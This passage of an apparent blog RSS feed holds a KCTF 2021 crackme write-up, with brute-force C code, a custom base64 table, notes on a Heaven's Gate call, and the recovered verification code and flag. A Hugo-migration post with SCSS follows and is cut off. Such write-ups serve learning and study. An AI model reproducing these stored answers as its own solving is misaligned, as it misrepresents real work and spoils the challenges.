          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; )
            &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;byte_414420[i];
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
        {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (a2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
                v19 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; byte_414420[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
                v19 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; byte_404000[byte_414420[i]];
            byte_414420[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v19;
            a2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v17;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v17 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; );
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; byte_414420[i];
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; b[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GoodJob~&amp;#34;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
            a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; k &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; k&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
                byte_414420[k] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; byte_404000[k];
            }
            calc(a, j);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (byte_414420[j] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; b[j])
                printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d %x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, j, a);
        }
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后得到下半段验证码 &lt;code&gt;D9B6AEF24A80CB22&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;第七题-声名远扬&#34;&gt;第七题 声名远扬&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;这题做完后懒了，没有交wp&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;初步分析了一下，看到一些字符串，发现这题用了 duilib 架构&lt;/p&gt;
&lt;p&gt;很多人的 wp 写的是用虚表找到验证函数，但我对虚表不太了解，做题的时候是用的动调下断点的方式做的&lt;/p&gt;
&lt;p&gt;动调的时候搜索字符串，发现能找到输入，然后在输入处下个硬件断点，能够断到 &lt;code&gt;strlen&lt;/code&gt;，出来后还能看到 &lt;code&gt;strncpy&lt;/code&gt;，但在这里断是不对的，因为没有点击检查，所以无论如何也进不了验证函数，于是朋友在获取消息的地方加了个消息断点，这时候再用硬件断点断下来，然后不断取消当前断点，在 &lt;code&gt;strncpy&lt;/code&gt; 到的地方下新的断点，就能够进入到加密函数&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 153; 
			flex-basis: 368px&#34;
	&gt;
	&lt;a href=&#34;/post/two-challenges-in-kctf2021-fall/base64.png&#34; data-size=&#34;1294x842&#34;&gt;
		&lt;img src=&#34;/post/two-challenges-in-kctf2021-fall/base64.png&#34;
			width=&#34;1294&#34;
			height=&#34;842&#34;
			srcset=&#34;/post/two-challenges-in-kctf2021-fall/base64_hufdf4e731bd789e2f7f85777a38453208_106372_480x0_resize_box_3.png 480w, /post/two-challenges-in-kctf2021-fall/base64_hufdf4e731bd789e2f7f85777a38453208_106372_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这个 base64 应该还是很容易看出来的，但动调拿结果能发现明显换表了，函数往里跟也不好跟，于是直接用动调拿结果&lt;/p&gt;
&lt;p&gt;这里构造了一个长度为 50 的输入，能够得到所有的 base64 字符&lt;/p&gt;
&lt;p&gt;输入：&lt;code&gt;n++j&#39;^aKgJ9*|an@@o$|8)9z#-;&amp;lt;&amp;lt;v789ghistu:/&amp;gt;^c?,/@YZ&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;标准表下的输出：&lt;code&gt;bisraideYUtnSjkqfGFuQEBvJHw4KTl6Iy07PDx2Nzg5Z2hpc3R1Oi8+XmM/LC9AWVo=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个输入就可以总结出这个题的 base 表了&lt;/p&gt;
&lt;p&gt;&lt;code&gt;prvo9CHSJOcPIb6xRVUXQz0qBGDE72LNZduaefYT5K_8-4FAhlimjkngt1yMWs3w!&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接下来继续用动调找验证函数&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 334; 
			flex-basis: 803px&#34;
	&gt;
	&lt;a href=&#34;/post/two-challenges-in-kctf2021-fall/heavens_gate.png&#34; data-size=&#34;1551x463&#34;&gt;
		&lt;img src=&#34;/post/two-challenges-in-kctf2021-fall/heavens_gate.png&#34;
			width=&#34;1551&#34;
			height=&#34;463&#34;
			srcset=&#34;/post/two-challenges-in-kctf2021-fall/heavens_gate_hudd88a720f3221254d24ba5059a43de09_40181_480x0_resize_box_3.png 480w, /post/two-challenges-in-kctf2021-fall/heavens_gate_hudd88a720f3221254d24ba5059a43de09_40181_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以看到 &lt;code&gt;v17 = xxx | 0x3300000000&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;而最后的 call 是 &lt;code&gt;MK_FP(WORD2(v17), v17)()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;结合着 32 位程序，猜测是一个天堂之门&lt;/p&gt;
&lt;p&gt;把调用的函数取出来，ida64 反编译一下&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 138; 
			flex-basis: 331px&#34;
	&gt;
	&lt;a href=&#34;/post/two-challenges-in-kctf2021-fall/check_cipher.png&#34; data-size=&#34;1154x836&#34;&gt;
		&lt;img src=&#34;/post/two-challenges-in-kctf2021-fall/check_cipher.png&#34;
			width=&#34;1154&#34;
			height=&#34;836&#34;
			srcset=&#34;/post/two-challenges-in-kctf2021-fall/check_cipher_hu8610347159ac7cb9c9671e29a84bb266_49459_480x0_resize_box_3.png 480w, /post/two-challenges-in-kctf2021-fall/check_cipher_hu8610347159ac7cb9c9671e29a84bb266_49459_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这个函数大致猜测一下，显然是要求 &lt;code&gt;v8 == v9[v28 - a1]&lt;/code&gt; 一直成立&lt;/p&gt;
&lt;p&gt;一开始的 &lt;code&gt;do while&lt;/code&gt; 循环是对目标密文做了个解密，于是动调到验证的地方看一下内存&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GYldGg-iIoJlPX9hPXpjPqfdEY21B01TBTzeGqfKNR!!&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;前面已经知道了 &lt;code&gt;!&lt;/code&gt; 就是这里 base64 的填充，于是这个字符串就是密文了&lt;/p&gt;
&lt;p&gt;换表 base64 的解密&lt;/p&gt;
&lt;p&gt;把表换回来之后的密文：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ZmxhZ3syMDIxLTEwLTA0LXlhbmd5YW5nYnVkZXlpfQ==&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;明显的 flag 标志 &lt;code&gt;Zmxh&lt;/code&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Migrate to Hugo</title>
        <link>/post/migrate-to-hugo/</link>
        <pubDate>Tue, 21 Dec 2021 23:23:50 +0800</pubDate>
        
        <guid>/post/migrate-to-hugo/</guid>
        <description>&lt;img src="/post/migrate-to-hugo/hugo-stack-logo.jpg" alt="Featured image of post Migrate to Hugo" /&gt;&lt;h2 id=&#34;修改主题的想法&#34;&gt;修改主题的想法&lt;/h2&gt;
&lt;p&gt;之前的 Next 用了有一年多了，自己也做了各种修改，比如加个背景、改个字体之类的。但最近发现由于我硬改了一些颜色，导致深色模式下没什么问题，但浅色模式下就有一个模块是黑色的，很难看，又懒得找当时自己写的代码在哪儿了。&lt;/p&gt;
&lt;p&gt;另一个原因是队友们都跟风用 Next 主题，难免有点审美疲劳。最终就决定给自己换个主题。&lt;/p&gt;
&lt;h2 id=&#34;本来的选择&#34;&gt;本来的选择&lt;/h2&gt;
&lt;p&gt;其实最一开始并没有打算换成 Hugo，毕竟 Hexo 又不是不能用，既然很多东西都配置好了，那换个主题直接生成多好。于是我精挑细选选了个一个 Hexo 主题：https://github.com/Haojen/hexo-theme-Claudia。&lt;/p&gt;
&lt;p&gt;然而配置的时候发现好像因为 npm 的原因，&lt;code&gt;scss&lt;/code&gt; 文件一直跑不起来，很多 &lt;code&gt;css&lt;/code&gt; 文件无法生成，于是就想干脆迁移到 Hugo，这样还省得配 npm 了。&lt;/p&gt;
&lt;h2 id=&#34;结识-hugo-stack&#34;&gt;结识 Hugo stack&lt;/h2&gt;
&lt;p&gt;最初看到 Hugo 其实是在帮 web 手收集博客的时候看到了陆队的博客，正好记录了迁移到 Hugo 的过程。博客里讲了 Hugo 的静态网页生成速度很快。联想到自己的博客垃圾文章也越来越多，Hexo 确实有点慢了，Hugo 也许以后会是个不错的选择。&lt;/p&gt;
&lt;p&gt;后来想要帮校队搭个博客，于是决定试试 Hugo。最一开始看中的是 Hugo Bootstrap Theme，想把背景改一下颜色，但是失败了，于是又找了找主题，发现 Stack 更好看，于是干脆就拿 Stack 搭了，而后来才发现，原来陆队的博客也是 stack 主题，看来审美从来没有变过 😂。&lt;/p&gt;
&lt;p&gt;于是，在 Claudia 配置失败后，我果断转到了 Hugo Stack 主题。&lt;/p&gt;
&lt;h2 id=&#34;目前的修改&#34;&gt;目前的修改&lt;/h2&gt;
&lt;h3 id=&#34;友链&#34;&gt;友链&lt;/h3&gt;
&lt;p&gt;Stack 主题本身是不带友链的，作者应该是正在写，但比较忙，也不知道什么时候能写完，于是就看了看别人的方案。直接搜能搜到一个方案，但讲得不是特别清楚，搭建失败了。后来在 pull request 里面发现有人实现了一个，作者没有采纳而已，于是就以这个作为临时方案了。&lt;/p&gt;
&lt;p&gt;主题 &lt;code&gt;assets/scss/style.scss&lt;/code&gt; 27行添加：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-scss&#34; data-lang=&#34;scss&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;@import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;partials/layout/links.scss&amp;#34;&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;新建 &lt;code&gt;assets/scss/partials/layout/links.scss&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-scss&#34; data-lang=&#34;scss&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* Place your custom SCSS in HUGO_SITE_FOLDER/assets/scss/custom.scss */&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;// 头像边框颜色
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$avatar-border-color&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;#566a82&lt;/span&gt;;
$avatar-border-color-dark&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; 	&lt;span style=&#34;color:#ae81ff&#34;&gt;#C0C0C0&lt;/span&gt;;

&lt;span style=&#34;color:#75715e&#34;&gt;// style-card 背景色
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$friend-link-background-color&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;#51a8ca&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
$friend-link-background-color-dark&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;#696971&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;;

&lt;span style=&#34;color:#75715e&#34;&gt;// 友链 name 原始色
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$friend-link-color&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;#11a1a2&lt;/span&gt;;
$friend-link-color-dark&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;#ffffff&lt;/span&gt;;

&lt;span style=&#34;color:#75715e&#34;&gt;// 友链 name 气泡响应对比色
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$friend-link-hover-color&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;#ea4e2f&lt;/span&gt;;
$friend-link-hover-color-dark&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;rgb&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;241&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;213&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;159&lt;/span&gt;);

&lt;span style=&#34;color:#75715e&#34;&gt;// bio 简介上下文
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$context-color&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;#404040&lt;/span&gt;;
$context-color-dark&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color:#ae81ff&#34;&gt;#c0c0c0&lt;/span&gt;;

&lt;span style=&#34;color:#75715e&#34;&gt;// 友链头像及头像边框的样式
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;.friend-avatar&lt;/span&gt; {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;width&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;height&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;padding&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;margin-top&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;margin-left&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;border-radius&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;border&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;.6&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; inset $avatar-border-color;
    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;data-scheme&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;dark&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;amp;&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;border&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;.6&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; inset $avatar-border-color-dark;   
    }
}

&lt;span style=&#34;color:#a6e22e&#34;&gt;.friend-link-div&lt;/span&gt; {
    &lt;span style=&#34;color:#75715e&#34;&gt;// 实现卡片双栏排列效果
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;height&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; auto;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;margin-top&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; auto;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;margin-inline-start&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;.5&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;%&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;width&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;%&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;display&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; inline-block &lt;span style=&#34;color:#66d9ef&#34;&gt;!important&lt;/span&gt;;

    &lt;span style=&#34;color:#75715e&#34;&gt;// 控制上下连续排列的卡片之间的行距
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;margin-bottom&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;

    &lt;span style=&#34;color:#75715e&#34;&gt;// 卡片圆角
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;border-radius&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;

    &lt;span style=&#34;color:#75715e&#34;&gt;// 卡片阴影
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;-webkit-box-shadow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rgba&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;231&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;224&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;224&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;.15&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;-moz-box-shadow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rgba&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;.15&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;box-shadow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;.7&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rgba&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;.16&lt;/span&gt;);

    &lt;span style=&#34;color:#75715e&#34;&gt;// 卡片背景色
